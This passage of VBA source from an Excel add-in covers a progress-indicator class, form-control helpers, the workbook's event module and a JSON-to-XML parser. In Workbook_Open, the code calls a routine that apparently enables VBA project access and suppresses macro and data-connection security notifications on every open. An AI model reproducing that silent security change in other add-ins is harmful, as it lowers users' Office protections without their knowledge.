    FP.SpinButton_log.value = LogSize
    FP.SpinButton_log.Visible = LogSize > 0
    SetLogSize LogSize
End Sub

Sub Hide()
    Unload FP
    FPVisible = False
End Sub

Sub Repaint()
    FP.Repaint: DoEvents
    'If Application.ScreenUpdating = False Then Application.ScreenUpdating = True: Application.ScreenUpdating = False
End Sub

Sub Move(ByVal Position&)
    If Abs(Position) > 3 Then Exit Sub
    If Not Me.Parent Is Nothing Then
        FP.Top = Me.Parent.FP.Top + Me.Parent.FP.Height + 10 + (FP.Height + 3) * (Position - 1)
    Else
        FP.Top = FP.Top + (FP.Height + 3) * Position
    End If
End Sub

Public Property Get Visible(): Visible = FPVisible: End Property

Public Property Let line1(ByVal newValue$): FP.L1.Caption = ProcessLabel(newValue): Me.FP.Repaint: DoEvents: End Property
Public Property Let line2(ByVal newValue$): FP.L2.Caption = ProcessLabel(newValue): Me.FP.Repaint: DoEvents: End Property
Public Property Let Line3(ByVal newValue$): FP.L3.Caption = ProcessLabel(newValue): Me.FP.Repaint: DoEvents: End Property
Public Property Let Caption(ByVal newValue$): SetProgressFormCaption newValue: End Property

Private Sub SetProgressFormCaption(Optional ByVal Caption$ = "")
    Dim txt$, dt$
    If Len(Caption) > 0 Then FP.Tag = Caption
    txt = Trim(FP.Tag): If ShowPercents Then txt = Fix(Percent) & " %   " & txt
    dt = Format(Now - FPStartTime, "HH:NN:SS")
    If ShowTime Then txt = "( " & dt & " )    " & txt
    FP.Caption = txt
End Sub

Private Function TimeToFinish$()
    On Error Resume Next: Dim dt As Single
    If Percent < 15 Then Exit Function
    dt = (Now - FPStartTime) * (100 - Percent) / Percent
    TimeToFinish$ = Format(dt, "H:NN:SS")
    TimeToFinish$ = MSG_EstimatedTime$ & ": " & TimeToFinish$
End Function

Sub SetFocus()
    FP.Show 0: If Position <> 0 Then Move Position
End Sub

Private Sub UpdateLabels(Optional ByVal L1_txt$, Optional ByVal L2_txt$, Optional ByVal L3_txt$)
    If Len(L1_txt$) > 0 Then FP.L1.Caption = ProcessLabel(L1_txt$)
    If Len(L1_txt$) + Len(L2_txt$) > 0 Then FP.L2.Caption = ProcessLabel(L2_txt$)
    If Len(L1_txt$) + Len(L2_txt$) + Len(L3_txt$) > 0 Then FP.L3.Caption = ProcessLabel(L3_txt$)
End Sub

Private Function ProcessLabel$(ByVal txt$)
    If txt Like "*$index*" Then txt = Replace(txt, "$index", SubActionIndex)
    If txt Like "*$count*" Then txt = Replace(txt, "$count", SubActionsCount)
    If txt Like "*$time*" Then txt = Replace(txt, "$time", TimeToFinish)
    ProcessLabel = txt
    SetProgressFormCaption
End Function

Sub SubAction(Optional ByVal L1_txt$ = "", Optional ByVal L2_txt$ = "", Optional ByVal L3_txt$ = "")
    On Error Resume Next
    If SubActionsCount = 0 Then SubActionsCount = 1
    SubActionIndex = SubActionIndex + 1 * SubActionsStep
    If SubActionIndex > SubActionsCount Then SubActionIndex = SubActionsCount
    Percent = PrS + (PrE - PrS) * ((SubActionIndex - 1) / SubActionsCount)
    UpdateLabels L1_txt$, L2_txt$, L3_txt$
    Set_ProgressBar Percent: DoEvents
End Sub

Sub StartNewAction(Optional ByVal Pr_Start& = 0, Optional ByVal Pr_End& = 100, _
                   Optional ByVal L1_txt$ = "", Optional ByVal L2_txt$ = " ", Optional ByVal L3_txt$ = " ", _
                   Optional ByVal Actions_Count& = 0)
    On Error Resume Next
    PrS = Pr_Start: PrE = Pr_End: SubActionIndex = 0: SubActionsCount = Actions_Count
    UpdateLabels L1_txt$, L2_txt$, L3_txt$
    Set_ProgressBar PrS
End Sub

Sub UpdateFromChild(ByVal ChildPercent As Double)
    If SubActionsCount = 0 Then
        Percent = PrS + (PrE - PrS) * (ChildPercent / 100)
    Else
        Percent = PrS + (PrE - PrS) / SubActionsCount * (SubActionIndex - 1) + (PrE - PrS) / SubActionsCount * (ChildPercent / 100)
    End If
    Set_ProgressBar Percent
End Sub

Private Sub Set_ProgressBar(ByVal NewPercent As Double)
    On Error Resume Next: Percent = NewPercent
    If NewPercent > 100 Then Percent = 100
    If NewPercent < 0 Then Percent = 0
    FP.PrBar.Width = Int(Percent * ProgressBar_Default_Width / 100)
    SetProgressFormCaption
    FP.Repaint
    If Not Parent Is Nothing Then Parent.UpdateFromChild Percent
End Sub

Private Sub Class_Terminate()
    On Error Resume Next
    Unload FP: FPVisible = False
    Set FP = Nothing: Set Children = Nothing: Set Parent = Nothing
End Sub

Private Function ProgressBar_Default_Width() As Double
    ProgressBar_Default_Width = FP.Width - 18
End Function

Function CancelButton() As MSForms.CommandButton
    Set CancelButton = FP.CommandButton_stop
End Function

Sub SetLogSize(ByVal n&)
    On Error Resume Next
    If n < 0 Then n = 0
    If n > 5 Then n = 5
    FP.SpinButton_log.value = n
    FP.SpinButton_log.Visible = n > 0
End Sub

Sub Log(ByVal txt$, Optional ByVal MaxLen& = 0)
    On Error Resume Next: Dim currtime$, newtext$
    If ShowTimeInLog Then currtime$ = Time & vbTab
    LogString = LogString & vbNewLine & currtime$ & txt
    newtext$ = Mid(LogString, 3): If MaxLen& Then newtext$ = Right(newtext$, MaxLen&)
    FP.TextBox_Log.Text = newtext$
    If FP.SpinButton_log.value = 0 Then FP.SpinButton_log.value = 2: FP.SpinButton_log.Visible = True
    FP.CommandButton_stop.SetFocus: FP.TextBox_Log.SetFocus
End Sub

Sub ClearLog()
    LogString = "": FP.TextBox_Log.Text = ""
End Sub

Sub ShowLog()
    On Error Resume Next: Dim filename$
    filename$ = Environ("TEMP") & "\macro_log.txt"
    With CreateObject("scripting.filesystemobject").CreateTextFile(filename, True)
        .Write Mid(LogString, 3): .Close
    End With
    FollowHyperlink """" & filename$ & """"
End Sub

Sub AddButton(ByVal Caption$, ByVal Macro$)
    Const dd& = 18
    If FP.SpinButton_log = 0 Then FP.SpinButton_log = 1
    With Me.FP.CommandButton_RunMacro
        .Caption = Caption$
        .Visible = True
        .Top = FP.Height - .Height - dd - 20
        .Left = FP.Width - .Width - dd - 15
    End With
    FP.ButtonMacro = Macro$
End Sub

Function MacroButton() As MSForms.CommandButton
    Set MacroButton = FP.CommandButton_RunMacro
End Function

Sub QueryClose()
    On Error Resume Next
    Dim pi As ProgressIndicator
    For Each pi In Children
        pi.QueryClose
        pi.Hide
    Next pi
End Sub


Attribute VB_Name = "SpecialControl"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : SpecialControl                    Version:
' Author        : Igor Vakhnenko                   Date: 05.07.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text
Public WithEvents Scroller As MSForms.ScrollBar
Attribute Scroller.VB_VarHelpID = -1
Public WithEvents ScrolledCombo As MSForms.ComboBox
Attribute ScrolledCombo.VB_VarHelpID = -1
Dim ScrollEventEnabled As Boolean

Public WithEvents MainCheckboxInFrame As MSForms.CheckBox
Attribute MainCheckboxInFrame.VB_VarHelpID = -1
'Public WithEvents FontSelectCombo As MSForms.ComboBox
Public WithEvents ColorSelectCombo As MSForms.ComboBox
Attribute ColorSelectCombo.VB_VarHelpID = -1
Public WithEvents KeyNameTexbox As MSForms.TextBox
Attribute KeyNameTexbox.VB_VarHelpID = -1
Public WithEvents NumericTexbox As MSForms.TextBox
Attribute NumericTexbox.VB_VarHelpID = -1

Private Sub NumericTexbox_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)
    On Error Resume Next
    Select Case KeyAscii
        Case 48 To 57, 8
        Case Else: KeyAscii = 0
    End Select
End Sub

' -----------------------------------------------------------------------------------

'Private Sub FontSelectCombo_Change()
'    On Error Resume Next: Me.FontSelectCombo.SelStart = 1
'    With New FontParameters
'        .LoadFromText (Me.FontSelectCombo)
'        .ApplyToSettingsField Me.FontSelectCombo
'    End With
'    Me.FontSelectCombo.SelStart = 1
'End Sub
'
'Private Sub FontSelectCombo_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
'    On Error Resume Next: Me.FontSelectCombo.SelStart = 1
'    With New FontParameters
'        .LoadFromText (Me.FontSelectCombo): .PickNewFont
'        Me.FontSelectCombo = .ExportToText
'
'        Dim UF As Object: Set UF = Me.FontSelectCombo
'        While TypeName(UF) <> "UserForm": Set UF = UF.Parent: Wend
'        UF.Show
'    End With
'    Me.FontSelectCombo.SelStart = 1
'End Sub

' -----------------------------------------------------------------------------------
'Private Sub KeyNameTexbox_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)
'    KeyAscii = 0
'End Sub
'Private Sub KeyNameTexbox_KeyUp(ByVal KeyCode As MSForms.ReturnInteger, ByVal Shift As Integer)
'    On Error Resume Next: Button$ = GetKeyName(KeyCode, Shift)
'    If Len(Button$) Then KeyCode = 0: Me.KeyNameTexbox = Button$
'End Sub
' -----------------------------------------------------------------------------------
'Private Sub ColorSelectCombo_Change()
'    On Error Resume Next: clr& = Val(Me.ColorSelectCombo)
'    If clr& >= 0 Then
'        Me.ColorSelectCombo.ForeColor = clr&: Me.ColorSelectCombo.BackColor = clr&
'    Else
'         clr& = vbButtonFace
'        Me.ColorSelectCombo.ForeColor = clr&: Me.ColorSelectCombo.BackColor = clr&
'    End If
'End Sub
'
'Private Sub ColorSelectCombo_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
'    On Error Resume Next: clr& = PickNewColor(IIf(Me.ColorSelectCombo = "", xlNone, Val(Me.ColorSelectCombo)))
'    Me.ColorSelectCombo = clr&
'End Sub

' -----------------------------------------------------------------------------------
Private Sub MainCheckboxInFrame_Change()
    On Error Resume Next: Err.Clear
    Dim fr As MSForms.Frame, ctrl As MSForms.Control: Set fr = Me.MainCheckboxInFrame.Parent
    If Err <> 0 Or (fr Is Nothing) Then MsgBox "MainCheckboxInFrame.Parent is not frame control": Exit Sub
    For Each ctrl In fr.Controls
        If ctrl.Name <> Me.MainCheckboxInFrame.Name Then
            ctrl.Enabled = Me.MainCheckboxInFrame.value
        End If
    Next
End Sub
' -----------------------------------------------------------------------------------
Function FieldFound() As Boolean
    On Error Resume Next
    If Not ScrolledCombo Is Nothing Then FieldFound = True: Exit Function
    ScrollEventEnabled = False: Me.Scroller.value = 1: ScrollEventEnabled = True
    Dim ctrl As MSForms.Control
    For Each ctrl In Me.Scroller.Parent.Controls
        If TypeName(ctrl) = "ComboBox" Then
            If ctrl.Top < Scroller.Top And ctrl.Left < Scroller.Left And _
               ctrl.Top + ctrl.Height > Scroller.Top + Scroller.Height And ctrl.Left + ctrl.Width > Scroller.Left + Scroller.Width Then
                Set ScrolledCombo = ctrl
                FieldFound = True: Exit Function
            End If
        End If
    Next
    MsgBox "Combo not found", , Me.Scroller.Name
End Function

Private Sub Scroller_Change()
    On Error Resume Next: If Not Me.FieldFound Then Exit Sub
    If Not ScrollEventEnabled Then Exit Sub
    Select Case Me.Scroller.value
        Case 0: Me.ScrolledCombo.ListIndex = Me.ScrolledCombo.ListIndex + 1
        Case 2: If Me.ScrolledCombo.ListIndex > 0 Then Me.ScrolledCombo.ListIndex = Me.ScrolledCombo.ListIndex - 1
    End Select
    ScrollEventEnabled = False: Me.Scroller.value = 1: ScrollEventEnabled = True
End Sub

Attribute VB_Name = "ThisWB"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
'---------------------------------------------------------------------------------------
' VBA Document      : ThisWB
' Author        : EducatedFool                     Date: 18.01.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/         Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Public WithEvents app As Application
Attribute app.VB_VarHelpID = -1

Private Sub app_SheetBeforeDoubleClick(ByVal sh As Object, ByVal Target As Range, Cancel As Boolean)
    On Error Resume Next: Err.Clear
    If sh.Parent Is ThisWorkbook Then Exit Sub
    
    If Not SETT.GetBoolean("CheckBox_DisableDoubleClickOnHeader") Then
        If Target.Row = HEADER_ROW And Target.Cells.Count = 1 Then
            If Len(Trim(Target)) > 0 Then
                Cancel = True
                If Target <> Trim(Target) Then Target = Trim(Target)
                TriesCount& = 0: code$ = "{" & Trim(Target) & "}"
                
                SetClipboard code$
                Err.Clear
                '                Do
                '                    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
                '                        .SetText code$
                '                        .PutInClipboard
                '
                '                        .GetFromClipboard
                '                        res$ = .GetText
                '                        TriesCount& = TriesCount& + 1
                '                    End With
                '                Loop While res$ <> code$ And TriesCount& < 10
                
                '                If Err = 0 And res$ = code$ Then
                Shell "Cmd.exe /c echo " & Chr(7), vbHide
                '                Else
                '                    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
                '                        .SetText ""
                '                        .PutInClipboard
                '                    End With
                '                End If
            End If
        End If
    End If
    
    If Target.Cells.Count = 1 Then
        If HasLinkToObject(Target.Cells(1).Text) Then Cancel = True: CtrlShiftT
    End If
End Sub

Private Sub Workbook_BeforeClose(Cancel As Boolean)
    On Error Resume Next
    DeleteProgramCommandBar
    Disable_HotKeys
End Sub

Private Sub Workbook_Open()
    On Error Resume Next: Dim FirstRun As Boolean
    FirstRun = SETT.IsFirstRun
    If FirstRun Then ShowFirstRunForm
    If SetupCancelled Then
        Application.DisplayAlerts = False
        If TrueDeveloper Then MsgBox "Setup Cancelled", vbInformation Else ThisWorkbook.Close False
        Application.DisplayAlerts = True
        Exit Sub
    End If
    Enable_AccessVBOM_Macro_DataConnections        ' disables notifications
    SaveSetting PROJECT_NAME$, "Setup", "AddinPath", ThisWorkbook.FullName
    If FirstRun Then If IsObject(F_Greeting) Then F_Greeting.Show
    CreateProgramCommandBar 0
    
    Enable_HotKeys
End Sub
Attribute VB_Name = "cJSONparser"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
' VBJSON is a VB6 adaptation of the VBA JSON project at http://code.google.com/p/vba-json/
' Some bugs fixed, speed improvements added for VB6 by Michael Glaser (vbjson@ediy.co.nz)
' BSD Licensed

' Export to XML function added by EducatedFool (http://ExcelVBA.ru/)

Option Explicit

Const INVALID_JSON As Long = 1
Const INVALID_OBJECT As Long = 2
Const INVALID_ARRAY As Long = 3
Const INVALID_BOOLEAN As Long = 4
Const INVALID_NULL As Long = 5
Const INVALID_KEY As Long = 6
Const INVALID_RPC_CALL As Long = 7

Private psErrors As String

Public Function GetParserErrors() As String
    GetParserErrors = psErrors
End Function

Public Function ClearParserErrors() As String
    psErrors = ""
End Function

Public Function ToXML(ByRef txt As String) As String
    ' |fffd| 2014 EducatedFool
    Dim xml As Object, node As Object, v As Variant, k As Variant, JSONobject As Object

    On Error Resume Next
    Set JSONobject = Me.Parse(txt)
    If Not IsObject(JSONobject) Then
        ToXML = GetParserErrors
        Exit Function
    End If

    Set xml = CreateObject("Microsoft.XMLDOM")
    With xml
        .preserveWhiteSpace = True
        .appendChild .createProcessingInstruction("xml", "version='1.0' encoding='utf-8'")
        Set node = .appendChild(.createElement("root"))

        ConvertToXML JSONobject, node
        ToXML = .xml
    End With
End Function

Function ConvertToXML(ByRef obj As Variant, ByRef node As Object, Optional ByVal key As Variant = "", Optional ByVal lvl As Long)
    ' |fffd| 2014 EducatedFool
    On Error Resume Next
    Dim k As Variant, item As Variant, txt$, subnode As Object, cnt&, XMLkey$
    XMLkey$ = key: If key Like "#*" Then XMLkey$ = "qq_" & key

    Select Case TypeName(obj)

        Case "Collection"
            For Each item In obj
                cnt& = cnt& + 1
                Set subnode = node.appendChild(node.OwnerDocument.createElement(IIf(key = "", "item" & (lvl + 1), XMLkey$)))
                subnode.Attributes.setNamedItem(node.OwnerDocument.createAttribute("index")).Text = cnt&
                ConvertToXML item, subnode, , lvl + 1
                Set subnode = Nothing
            Next
            If cnt& = 0 Then ConvertToXML "", node.appendChild(node.OwnerDocument.createElement(XMLkey$))

        Case "Dictionary"
            Set subnode = node
            If Len(key) Then Set subnode = node.appendChild(node.OwnerDocument.createElement(XMLkey$))
            For Each key In obj.Keys
                ConvertToXML obj(key), subnode, key
            Next

        Case Else
            txt$ = "": If Not IsNull(obj) Then txt$ = obj
            If key Like "@?*" Then
                node.Attributes.setNamedItem(node.OwnerDocument.createAttribute(Mid(key, 2))).Text = txt$
            Else
                Set subnode = node
                If node.BaseName <> key And Len(key) > 0 Then Set subnode = node.appendChild(node.OwnerDocument.createElement(XMLkey$))
                subnode.Text = txt$
                Set subnode = Nothing
            End If
    End Select
End Function

'
'   parse txting and create JSON object
'
Public Function Parse(ByRef txt As String) As Object

    Dim Index As Long
    Index = 1
    psErrors = ""
    On Error Resume Next
    Call skipChar(txt, Index)
    Select Case Mid(txt, Index, 1)
        Case "{"
            Set Parse = parseObject(txt, Index)
        Case "["
            Set Parse = parseArray(txt, Index)
        Case Else
            psErrors = "Invalid JSON"
    End Select
End Function

'
'   parse collection of key/value
'
Private Function parseObject(ByRef txt As String, ByRef Index As Long) As Dictionary

    Set parseObject = New Dictionary
    Dim sKey As String

    ' "{"
    Call skipChar(txt, Index)
    If Mid(txt, Index, 1) <> "{" Then
        psErrors = psErrors & "Invalid Object at position " & Index & " : " & Mid(txt, Index) & vbCrLf
        Exit Function
    End If

    Index = Index + 1

    Do
        Call skipChar(txt, Index)
        If "}" = Mid(txt, Index, 1) Then
            Index = Index + 1
            Exit Do
        ElseIf "," = Mid(txt, Index, 1) Then
            Index = Index + 1
            Call skipChar(txt, Index)
        ElseIf Index > Len(txt) Then
            psErrors = psErrors & "Missing '}': " & Right(txt, 20) & vbCrLf
            Exit Do
        End If


        ' add key/value pair
        sKey = parseKey(txt, Index)
        On Error Resume Next: Err.Clear

        parseObject.Add sKey, parseValue(txt, Index)
        If Err.Number <> 0 Then
            psErrors = psErrors & Err.Description & ": " & sKey & vbCrLf
            Exit Do
        End If
    Loop
eh:

End Function

'
'   parse list
'
Private Function parseArray(ByRef txt As String, ByRef Index As Long) As Collection

    Set parseArray = New Collection

    ' "["
    Call skipChar(txt, Index)
    If Mid(txt, Index, 1) <> "[" Then
        psErrors = psErrors & "Invalid Array at position " & Index & " : " + Mid(txt, Index, 20) & vbCrLf
        Exit Function
    End If

    Index = Index + 1

    Do

        Call skipChar(txt, Index)
        If "]" = Mid(txt, Index, 1) Then
            Index = Index + 1
            Exit Do
        ElseIf "," = Mid(txt, Index, 1) Then
            Index = Index + 1
            Call skipChar(txt, Index)
        ElseIf Index > Len(txt) Then
            psErrors = psErrors & "Missing ']': " & Right(txt, 20) & vbCrLf
            Exit Do
        End If

        ' add value
        On Error Resume Next: Err.Clear
        parseArray.Add parseValue(txt, Index)
        If Err.Number <> 0 Then
            psErrors = psErrors & Err.Description & ": " & Mid(txt, Index, 20) & vbCrLf
            Exit Do
        End If
    Loop

End Function

'
'   parse txting / number / object / array / true / false / null
'
Private Function parseValue(ByRef txt As String, ByRef Index As Long)

    Call skipChar(txt, Index)

    Select Case Mid(txt, Index, 1)
        Case "{"
            Set parseValue = parseObject(txt, Index)
        Case "["
            Set parseValue = parseArray(txt, Index)
        Case """", "'"
            parseValue = ParseString(txt, Index)
        Case "t", "f"
            parseValue = parseBoolean(txt, Index)
        Case "n"
            parseValue = parseNull(txt, Index)
        Case Else
            parseValue = parseNumber(txt, Index)
    End Select

End Function

'
'   parse txting
'
Private Function ParseString(ByRef txt As String, ByRef Index As Long) As String

    Dim quote As String
    Dim char As String
    Dim code As String

    Dim SB As New cStringBuilder

    Call skipChar(txt, Index)
    quote = Mid(txt, Index, 1)
    Index = Index + 1

    Do While Index > 0 And Index <= Len(txt)
        char = Mid(txt, Index, 1)
        Select Case (char)
            Case "\"
                Index = Index + 1
                char = Mid(txt, Index, 1)
                Select Case (char)
                    Case """", "\", "/", "'"
                        SB.Append char
                        Index = Index + 1
                    Case "b"
                        SB.Append vbBack
                        Index = Index + 1
                    Case "f"
                        SB.Append vbFormFeed
                        Index = Index + 1
                    Case "n"
                        SB.Append vbLf
                        Index = Index + 1
                    Case "r"
                        SB.Append vbCr
                        Index = Index + 1
                    Case "t"
                        SB.Append vbTab
                        Index = Index + 1
                    Case "u"
                        Index = Index + 1
                        code = Mid(txt, Index, 4)
                        SB.Append ChrW(Val("&h" + code))
                        Index = Index + 4
                End Select
            Case quote
                Index = Index + 1

                ParseString = SB.toString
                Set SB = Nothing

                Exit Function

            Case Else
                SB.Append char
                Index = Index + 1
        End Select
    Loop

    ParseString = SB.toString
    Set SB = Nothing

End Function

'
'   parse number
'
Private Function parseNumber(ByRef txt As String, ByRef Index As Long)
    On Error Resume Next: Err.Clear
    Dim value As String, char As String
    Call skipChar(txt, Index)
    Do While Index > 0 And Index <= Len(txt)
        char = Mid(txt, Index, 1)
        If InStr("+-0123456789.eE", char) Then
            value = value & char
            Index = Index + 1
        Else
            parseNumber = Replace(CDec(Replace(value, ".", Mid(1 / 2, 2, 1))), Mid(1 / 2, 2, 1), ".")
            Exit Function
        End If
    Loop
End Function

'
'   parse true / false
'
Private Function parseBoolean(ByRef txt As String, ByRef Index As Long) As Boolean

    Call skipChar(txt, Index)
    If Mid(txt, Index, 4) = "true" Then
        parseBoolean = True
        Index = Index + 4
    ElseIf Mid(txt, Index, 5) = "false" Then
        parseBoolean = False
        Index = Index + 5
    Else
        psErrors = psErrors & "Invalid Boolean at position " & Index & " : " & Mid(txt, Index) & vbCrLf
    End If

End Function

'
'   parse null
'
Private Function parseNull(ByRef txt As String, ByRef Index As Long)

    Call skipChar(txt, Index)
    If Mid(txt, Index, 4) = "null" Then
        parseNull = Null
        Index = Index + 4
    Else
        psErrors = psErrors & "Invalid null value at position " & Index & " : " & Mid(txt, Index) & vbCrLf
    End If

End Function

Private Function parseKey(ByRef txt As String, ByRef Index As Long) As String

    Dim DQUOTE As Boolean
    Dim squote As Boolean
    Dim char As String

    Call skipChar(txt, Index)
    Do While Index > 0 And Index <= Len(txt)
        char = Mid(txt, Index, 1)
        Select Case (char)
            Case """"
                DQUOTE = Not DQUOTE
                Index = Index + 1
                If Not DQUOTE Then
                    Call skipChar(txt, Index)
                    If Mid(txt, Index, 1) <> ":" Then
                        psErrors = psErrors & "Invalid Key at position " & Index & " : " & parseKey & vbCrLf
                        Exit Do
                    End If
                End If
            Case "'"
                squote = Not squote
                Index = Index + 1
                If Not squote Then
                    Call skipChar(txt, Index)
                    If Mid(txt, Index, 1) <> ":" Then
                        psErrors = psErrors & "Invalid Key at position " & Index & " : " & parseKey & vbCrLf
                        Exit Do
                    End If
                End If
            Case ":"
                Index = Index + 1
                If Not DQUOTE And Not squote Then
                    Exit Do
                Else
                    parseKey = parseKey & char
                End If
            Case Else
                If InStr(vbCrLf & vbCr & vbLf & vbTab & " ", char) Then
                Else
                    parseKey = parseKey & char
                End If
                Index = Index + 1
        End Select
    Loop

End Function

'
'   skip special character
'
Private Sub skipChar(ByRef txt As String, ByRef Index As Long)
    Dim bComment As Boolean
    Dim bStartComment As Boolean
    Dim bLongComment As Boolean
    Do While Index > 0 And Index <= Len(txt)
        Select Case Mid(txt, Index, 1)
            Case vbCr, vbLf
                If Not bLongComment Then
                    bStartComment = False
                    bComment = False
                End If

            Case vbTab, " ", "(", ")"

            Case "/"
                If Not bLongComment Then
                    If bStartComment Then
                        bStartComment = False
                        bComment = True
                    Else
                        bStartComment = True
                        bComment = False
                        bLongComment = False
                    End If
                Else
                    If bStartComment Then
                        bLongComment = False
                        bStartComment = False
                        bComment = False
                    End If
                End If

            Case "*"
                If bStartComment Then
                    bStartComment = False
                    bComment = True
                    bLongComment = True
                Else
                    bStartComment = True
                End If

            Case Else
                If Not bComment Then
                    Exit Do
                End If
        End Select

        Index = Index + 1
    Loop

End Sub

Public Function toString(ByRef obj As Variant) As String
    Dim SB As New cStringBuilder
    Select Case VarType(obj)
        Case vbNull
            SB.Append "null"
        Case vbDate
            SB.Append """" & CStr(obj) & """"
        Case vbString
            SB.Append """" & Encode(obj) & """"
        Case vbObject

            Dim bFI As Boolean
            Dim i As Long

            bFI = True
            If TypeName(obj) = "Dictionary" Then

                SB.Append "{"
                Dim Keys
                Keys = obj.Keys
                For i = 0 To obj.Count - 1
                    If bFI Then bFI = False Else SB.Append ","
                    Dim key
                    key = Keys(i)
                    SB.Append """" & key & """:" & toString(obj.item(key))
                Next i
                SB.Append "}"

            ElseIf TypeName(obj) = "Collection" Then

                SB.Append "["
                Dim value
                For Each value In obj
                    If bFI Then bFI = False Else SB.Append ","
                    SB.Append toString(value)
                Next value
                SB.Append "]"

            End If
        Case vbBoolean
            If obj Then SB.Append "true" Else SB.Append "false"
        Case vbVariant, vbArray, vbArray + vbVariant
            Dim sEB
            SB.Append multiArray(obj, 1, "", sEB)
        Case Else
            SB.Append Replace(obj, ",", ".")
    End Select

    toString = SB.toString
    Set SB = Nothing

End Function

Private Function Encode(txt) As String

    Dim SB As New cStringBuilder
    Dim i As Long
    Dim j As Long
    Dim aL1 As Variant
    Dim aL2 As Variant
    Dim c As String
    Dim p As Boolean

    aL1 = Array(&H22, &H5C, &H2F, &H8, &HC, &HA, &HD, &H9)
    aL2 = Array(&H22, &H5C, &H2F, &H62, &H66, &H6E, &H72, &H74)
    For i = 1 To Len(txt)
        p = True
        c = Mid(txt, i, 1)
        For j = 0 To 7
            If c = Chr(aL1(j)) Then
                SB.Append "\" & Chr(aL2(j))
                p = False
                Exit For
            End If
        Next

        If p Then
            Dim a
            a = AscW(c)
            If a > 31 And a < 127 Then
                SB.Append c
            ElseIf a > -1 Or a < 65535 Then
                SB.Append "\u" & String(4 - Len(Hex(a)), "0") & Hex(a)
            End If
        End If
    Next

    Encode = SB.toString
    Set SB = Nothing

End Function

Private Function multiArray(aBD, iBC, sPS, ByRef sPT)        ' Array BoDy, Integer BaseCount, String PoSition

    Dim iDU As Long
    Dim iDL As Long
    Dim i As Long

    On Error Resume Next
    iDL = LBound(aBD, iBC)
    iDU = UBound(aBD, iBC)

    Dim SB As New cStringBuilder

    Dim sPB1, sPB2        ' String PointBuffer1, String PointBuffer2
    If Err.Number = 9 Then
        sPB1 = sPT & sPS
        For i = 1 To Len(sPB1)
            If i <> 1 Then sPB2 = sPB2 & ","
            sPB2 = sPB2 & Mid(sPB1, i, 1)
        Next
        '        multiArray = multiArray & toString(Eval("aBD(" & sPB2 & ")"))
        SB.Append toString(aBD(sPB2))
    Else
        sPT = sPT & sPS
        SB.Append "["
        For i = iDL To iDU
            SB.Append multiArray(aBD, iBC + 1, i, sPT)
            If i < iDU Then SB.Append ","
        Next
        SB.Append "]"
        sPT = Left(sPT, iBC - 2)
    End If
    Err.Clear
    multiArray = SB.toString

    Set SB = Nothing
End Function

' Miscellaneous JSON functions

Public Function StringToJSON(ST As String) As String

    Const FIELD_SEP = "~"
    Const RECORD_SEP = "|"

    Dim sFlds As String
    Dim sRecs As New cStringBuilder
    Dim lRecCnt As Long
    Dim lFld As Long
    Dim fld As Variant
    Dim Rows As Variant

    lRecCnt = 0
    If ST = "" Then
        StringToJSON = "null"
    Else
        Rows = Split(ST, RECORD_SEP)
        For lRecCnt = LBound(Rows) To UBound(Rows)
            sFlds = ""
            fld = Split(Rows(lRecCnt), FIELD_SEP)
            For lFld = LBound(fld) To UBound(fld) Step 2
                sFlds = (sFlds & IIf(sFlds <> "", ",", "") & """" & fld(lFld) & """:""" & toUnicode(fld(lFld + 1) & "") & """")
            Next        'fld
            sRecs.Append IIf((Trim(sRecs.toString) <> ""), "," & vbCrLf, "") & "{" & sFlds & "}"
        Next        'rec
        StringToJSON = ("( {""Records"": [" & vbCrLf & sRecs.toString & vbCrLf & "], " & """RecordCount"":""" & lRecCnt & """ } )")
    End If
End Function


'Public Function RStoJSON(rs As ADODB.Recordset) As String
'   On Error GoTo errHandler
'   Dim sFlds As String
'   Dim sRecs As New cStringBuilder
'   Dim lRecCnt As Long
'   Dim fld As ADODB.Field
'
'   lRecCnt = 0
'   If rs.State = adStateClosed Then
'      RStoJSON = "null"
'   Else
'      If rs.EOF Or rs.BOF Then
'         RStoJSON = "null"
'      Else
'         Do While Not rs.EOF And Not rs.BOF
'            lRecCnt = lRecCnt + 1
'            sFlds = ""
'            For Each fld In rs.Fields
'               sFlds = (sFlds & IIf(sFlds <> "", ",", "") & """" & fld.Name & """:""" & toUnicode(fld.Value & "") & """")
'            Next 'fld
'            sRecs.Append IIf((Trim(sRecs.toString) <> ""), "," & vbCrLf, "") & "{" & sFlds & "}"
'            rs.MoveNext
'         Loop
'         RStoJSON = ("( {""Records"": [" & vbCrLf & sRecs.toString & vbCrLf & "], " & """RecordCount"":""" & lRecCnt & """ } )")
'      End If
'   End If
'
'   Exit Function
'errHandler:
'
'End Function

'Public Function JsonRpcCall(url As String, methName As String, args(), Optional user As String, Optional pwd As String) As Object
'    Dim r As Object
'    Dim cli As Object
'    Dim pText As String
'    Static reqId As Integer
'
'    reqId = reqId + 1
'
'    Set r = CreateObject("Scripting.Dictionary")
'    r("jsonrpc") = "2.0"
'    r("method") = methName
'    r("params") = args
'    r("id") = reqId
'
'    pText = toString(r)
'
'    Set cli = CreateObject("MSXML2.XMLHTTP.6.0")
'   ' Set cli = New MSXML2.XMLHTTP60
